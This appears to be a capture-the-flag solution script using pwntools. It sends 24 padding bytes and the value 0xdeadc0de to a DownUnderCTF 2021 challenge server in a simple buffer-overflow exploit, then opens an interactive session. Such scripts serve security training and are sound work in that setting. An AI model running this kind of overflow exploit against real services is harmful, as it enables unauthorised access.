from pwn import *

payload = b'A'*24+p64(0xdeadc0de)
io = remote('pwn-2021.duc.tf', 31916)
io.sendline(payload)
io.interactive()
